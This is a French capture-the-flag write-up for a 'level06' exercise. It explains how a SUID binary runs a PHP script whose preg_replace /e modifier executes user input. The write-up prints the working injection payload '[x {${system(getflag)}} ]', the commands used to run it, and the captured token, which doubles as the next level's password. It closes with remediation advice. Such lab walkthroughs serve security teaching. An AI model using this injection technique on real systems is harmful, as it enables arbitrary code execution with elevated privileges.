# Level06 — Explications

## Objectif
Exploiter un script PHP lancé par un binaire SUID `flag06` pour exécuter
`getflag` sous son identité et obtenir le token (= mot de passe de `level07`).

## Étapes

### 1. Repérer les fichiers
```bash
ls -la
# -rwsr-x---+ 1 flag06 level06 7503 level06       (binaire SUID flag06)
# -rwxr-x---  1 flag06 level06  356 level06.php    (le vrai code, lisible)
```

Le binaire appartient à flag06 et a le bit **SUID** → il s'exécute avec les
droits de flag06. `strings level06` montre `/usr/bin/php` et le chemin du script
→ le binaire ne fait que **lancer level06.php** en tant que flag06. La faille est
donc dans le PHP, qu'on peut lire (groupe level06).

### 2. Lire le script PHP
```bash
cat level06.php
```
```php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); ... }
$r = x($argv[1], $argv[2]); print $r;
```

Le script lit le **contenu du fichier** passé en argument (`$argv[1]`) et y
cherche le motif `[x ... ]`.

### 3. Identifier la faille : le modificateur `/e`
La ligne clé :
```php
preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

Le **`/e`** à la fin du motif fait que le texte de remplacement est **exécuté
comme du code PHP** (fonction notoirement dangereuse, supprimée des PHP récents).
Donc pour chaque `[x ... ]` trouvé, le script exécute :
```php
y("<ce qu'il y a entre [x et ]>")
```

### 4. Construire la charge
On veut exécuter `getflag`. Deux obstacles :
- La charge est passée **comme texte** à `y()` → il faut forcer son évaluation.
- Les guillemets (`'` et `"`) sont automatiquement échappés (magic_quotes) → il
  faut une charge **sans aucun guillemet**.

Solution : la syntaxe **`${ ... }`** dans une chaîne PHP `"..."` force PHP à
**évaluer** ce qu'il y a entre `${ }` au lieu de l'afficher comme texte. Et
`getflag` écrit **sans guillemets** est interprété comme la chaîne `"getflag"`
(PHP convertit un identifiant inconnu en chaîne), ce qui évite le problème des
guillemets échappés.

Contenu du fichier d'exploit :
```bash
echo '[x {${system(getflag)}} ]' > /tmp/exploit.php
```

Chaîne d'exécution :
```
[x {${system(getflag)}} ]
   └─ /e exécute → y("{${system(getflag)}}")
        └─ ${...} force l'évaluation de system(getflag)
             └─ getflag s'exécute en tant que flag06 → token
```

### 5. Lancer l'exploit
```bash
cd ~
./level06 /tmp/exploit.php
# Check flag. Here is your token : wiok45aaoguiboiki2tuin6ub
```

Les "PHP Notice" affichés autour sont du bruit sans conséquence (ils confirment
juste que `getflag` a été pris comme chaîne). Le token est au milieu.

Token obtenu : `wiok45aaoguiboiki2tuin6ub`

C'est le **flag de level06** et le **mot de passe de level07**.

## Résumé
binaire SUID flag06 → lance level06.php → `preg_replace` avec `/e` exécute
l'entrée → charge `[x {${system(getflag)}} ]` → `getflag` en tant que flag06

## À retenir
- `/e` sur `preg_replace` = le remplacement est **exécuté** comme du code PHP.
- Dans une chaîne `"..."`, **`${expression}`** force l'évaluation de l'expression
  au lieu de l'afficher comme texte.
- `getflag` sans guillemets → traité comme la chaîne `"getflag"` → évite les
  guillemets échappés par magic_quotes.

## Analyse de la faille

**Quelle était la faille ?**
Le script exécutait l'entrée utilisateur comme du code PHP, via le modificateur
`/e` de `preg_replace`. Toute donnée fournie pouvait donc être transformée en
code exécuté avec les droits de flag06.

**Pourquoi c'est un problème ?**
- Exécuter une entrée utilisateur comme du code = exécution de code arbitraire
  (RCE). C'est l'une des failles les plus graves.
- Le programme étant SUID flag06, ce code tourne avec des droits élevés.

**Comment l'empêcher ?**
- Ne jamais utiliser le modificateur `/e` (interdit dans les PHP modernes) ;
  utiliser `preg_replace_callback` avec une fonction sûre.
- Ne jamais traiter une entrée utilisateur comme du code.
- Valider / filtrer strictement les entrées, et éviter le SUID quand ce n'est
  pas indispensable (moindre privilège).